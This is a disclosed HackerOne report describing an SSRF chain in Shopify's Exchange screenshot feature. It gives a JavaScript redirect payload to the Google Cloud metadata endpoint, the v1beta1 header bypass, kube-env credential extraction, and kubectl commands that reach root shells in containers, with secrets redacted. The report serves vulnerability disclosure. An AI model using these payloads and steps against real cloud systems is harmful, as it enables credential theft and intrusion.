# SSRF in Exchange leads to ROOT access in all instances

## Report Details
- **Report ID**: 341876
- **URL**: https://hackerone.com/reports/341876
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2018-04-22T23:39:53.445Z
- **Disclosed**: 2018-05-23T21:09:28.855Z

## Reporter
- **Username**: 0xacb
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
## The Exploit Chain - How to get root access on all Shopify instances

### 1 - Access Google Cloud Metadata
- 1: Create a store (partners.shopify.com)
- 2: Edit the template `password.liquid` and add the following content:

```html
<script>
window.location="http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token";
// iframes don't work here because Google Cloud sets the `X-Frame-Options: SAMEORIGIN` header.
</script>
```

- 3: Go to https://exchange.shopify.com/create-a-listing and install the Exchange app
- 4: Wait for the store screenshot to appear on the Create Listing page
- 5: Download the PNG and open it using image editing software or convert it to JPEG (Chrome displays a black PNG)

{F289082}

Exploring SSRFs in Google Cloud instances require a special header. However, I found really easy way to "bypass" it while reading the documentation: the `/v1beta1` endpoint is still available, does not require the `Metadata-Flavor: Google` header and still returns the same token.

I tried to leak more data, but the web screenshot software wasn't producing any images for `application/text` responses. However, I found that I could add the parameter `alt=json` to force `application/json` responses. I managed to leak more data, such as an incomplete list of SSH public keys (including email addresses), the project name (`█████`), the instance name and more:

```html
<script>
window.location="http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json";
</script>
```
{F289081}

**Can I add my SSH key using the leaked token? No**

```bash
curl -X POST "https://www.googleapis.com/compute/v1/projects/███/setCommonInstanceMetadata" -H "Authorization: Bearer ██████████████" -H "Content-Type: application/json" --data '{"items": [{"key": "0xACB", "value": "test"}]}'
```
```json
{
 "error": {
  "errors": [
   {
    "domain": "global",
    "reason": "forbidden",
    "message": "Required 'compute.projects.setCommonInstanceMetadata' permission for 'projects/███████'"
   },
   {
    "domain": "global",
    "reason": "forbidden",
    "message": "Required 'iam.serviceAccounts.actAs' permission for 'projects/███████'"
   }
  ],
  "code": 403,
  "message": "Required 'compute.projects.setCommonInstanceMetadata' permission for 'projects/████████'"
 }
}
```

I checked the scopes for this token and there was no read/write access to the Compute Engine API:
```bash
curl "https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=██████████████████"
```
```json
{
 "issued_to": "███████",
 "audience": "███",
 "scope": "https://www.googleapis.com/auth/cloud-platform",
 "expires_in": 1307,
 "access_type": "offline"
}
```

### 2 - Dumping kube-env

I created a new store and pulled attributes from this instance recursively: http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/?recursive=true&alt=json

Result:
{F289455}

**Metadata concealment** (https://cloud.google.com/kubernetes-engine/docs/how-to/metadata-concealment) is not enabled, so the `kube-env` attribute is available.

Since the image is cropped, I made a new request to: http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json in order to see the rest of the Kubelet certificate and the Kubelet private key.

Result:
{F289456}

**ca.crt**
```
-----BEGIN CERTIFICATE-----
██████
███████
███████
████████
██████████████
████████
████████
███████
████
██████
███
█████████
████
████
████████
███████
███
-----END CERTIFICATE-----
```

**client.crt**
```
-----BEGIN CERTIFICATE-----
█████
███████
██████
████████
██████████
█████
██████
█████
█████
██████████
███████
█████
████
████
████████
████████
-----END CERTIFICATE-----
```

**client.pem**
```
-----BEGIN RSA PRIVATE KEY-----
█████████
██████
████████
████
████
█████████
██████████
██████
████████
█████████
██████
██████████
███
██████████
███
██████
█████████
████████
██████████
█████████
████
████
████████
████
███████
-----END RSA PRIVATE KEY-----
```

**MASTER_NAME**: █████

### 3 - Using Kubelet to execute arbitrary commands

It's possible to list all pods {F289460}:

```bash
$ kubectl --client-certificate client.crt --client-key client.pem --certificate-authority ca.crt --server https://██████ get pods --all-namespaces

NAMESPACE                                   NAME                                                              READY     STATUS             RESTARTS   AGE
████████                    ██████████                    1/1    
```

And create new pods as well:
```bash
$ kubectl --client-certificate client.crt --client-key client.pem --certificate-authority ca.crt --server https://████████ create -f https://k8s.io/docs/tasks/debug-application-cluster/shell-demo.yaml

pod "shell-demo" created
$ kubectl --client-certificate client.crt --client-key client.pem --certificate-authority ca.crt --server https://██████████ delete pod shell-demo

pod "shell-demo" deleted
```

I didn't tried to delete running pods, obviously, I'm not sure if I would be able to delete them with user `████████`. However, it's not possible to execute commands in this new pod or any other pod:
```bash
$ kubectl --client-certificate client.crt --client-key client.pem --certificate-authority ca.crt --server https://█████████ exec -it shell-demo -- /bin/bash

Error from server (Forbidden): pods "shell-demo" is forbidden: User "███" cannot create pods/exec in the namespace "default": Unknown user "███"
```

The `get secrets` command doesn't work, but it's possible to describe a given pod and the get the secret using its name. That's how I leaked the kubernetes.io service account token using the instance `████` from the namespace `████`:

```bash
$ kubectl --client-certificate client.crt --client-key client.pem --certificate-authority ca.crt --server https://███ describe pods/█████ -n █████████

Name:           ████████
Namespace:      ██████
Node:           ██████████
Start Time:     Fri, 23 Mar 2018 13:53:13 +0000
Labels:         █████
                ████
                █████
Annotations:    <none>
Status:         Running
IP:             █████████
Controlled By:  █████
Containers:
  default-http-backend:
    Container ID:   docker://███
    Image:          ██████
    Image ID:       docker-pullable://█████
    Port:           ████/TCP
    Host Port:      0/TCP
    State:          Running
      Started:      Sun, 22 Apr 2018 03:23:09 +0000
    Last State:     Terminated
      Reason:       Error
      Exit Code:    2
      Started:      Fri, 20 Apr 2018 23:39:21 +0000
      Finished:     Sun, 22 Apr 2018 03:23:07 +0000
    Ready:          True
    Restart Count:  180
    Limits:
      cpu:     10m
      memory:  20Mi
    Requests:
      cpu:        10m
      memory:     20Mi
    Liveness:     http-get http://:███/healthz delay=30s timeout=5s period=10s #success=1 #failure=3
    Environment:  <none>
    Mounts:
      ██████
Conditions:
  Type           Status
  Initialized    True
  Ready          True
  PodScheduled   True
Volumes:
 ██████████:
    Type:        Secret (a volume populated by a Secret)
    SecretName: ███████
    Optional:    false
QoS Class:       Guaranteed
Node-Selectors:  <none>
Tolerations:     node.kubernetes.io/not-ready:NoExecute for 300s
                 node.kubernetes.io/unreachable:NoExecute for 300s
Events:          <none>
```

```bash
$ kubectl --client-certificate client.crt --client-key client.pem --certificate-authority ca.crt --server https://██████ get secret███████ -n ███████ -o yaml

apiVersion: v1
data:
  ca.crt: ██████████
  namespace: ████
  token: ██████████==
kind: Secret
metadata:
  annotations:
    kubernetes.io/service-account.name: default
    kubernetes.io/service-account.uid: ████
  creationTimestamp: 2017-01-23T16:08:19Z
  name:█████
  namespace: ██████████
  resourceVersion: "115481155"
  selfLink: /api/v1/namespaces/████████/secrets/████
  uid: █████████
type: kubernetes.io/service-account-token
```

And finally, it's possible to use this token to get a shell in any container:
```bash
$ kubectl --certificate-authority ca.crt --server https://████ --token "█████.██████.███" exec -it w█████████ -- /bin/bash

Defaulting container name to web.
Use 'kubectl describe pod/w█████████' to see all of the containers in this pod.
███████:/# id
uid=0(root) gid=0(root) groups=0(root)
█████:/# ls
app  boot   dev  exec  key  lib64  mnt  proc  run   srv  start  tmp  var
bin  build  etc  home  lib  media  opt  root  sbin  ssl  sys    usr
███████:/# exit
```

```bash
$ kubectl --certificate-authority ca.crt --server https://███████ --token "█████.██████.█████████" exec -it ████████ -n ████████ -- /bin/bash

Defaulting container name to web.
Use 'kubectl describe pod/█████ -n █████' to see all of the containers in this pod.
root@████:/# id
uid=0(root) gid=0(root) groups=0(root)
root@████:/# ls
app  boot   dev  exec  key  lib64  mnt  proc  run   srv  start  tmp  var
bin  build  etc  home  lib  media  opt  root  sbin  ssl  sys    usr
root@█████:/# exit
```

---
*Huge thanks to [Luís Maia](https://www.linkedin.com/in/luis-maia-7714023a) [0xfad0](http://hackerone.com/0xfad0), for helping me build this █████*

## Impact

**CRITICAL**

The hacker selected the **Server-Side Request Forgery (SSRF)** weakness. This vulnerability type requires contextual information from the hacker. They provided the following answers:

**Can internal services be reached bypassing network access control?**
Yes

**What internal services were accessible?**
Google Cloud Metadata

**Security Impact**
RCE



## Attachments
No attachments
